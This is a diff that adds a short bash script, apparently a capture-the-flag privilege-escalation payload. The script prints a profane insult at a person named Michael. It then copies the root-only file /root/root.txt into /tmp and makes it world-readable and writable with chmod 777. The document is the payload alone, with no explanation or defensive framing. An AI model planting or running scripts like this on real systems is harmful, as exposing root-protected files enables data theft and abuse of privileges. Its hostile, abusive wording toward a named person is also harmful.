@@ -1,0 +1,7 @@
+#!/bin/bash
+
+set -e
+
+echo "FUCK YOU MICHAEL"
+cp /root/root.txt /tmp/root.txt
+chmod 777 /tmp/root.txt
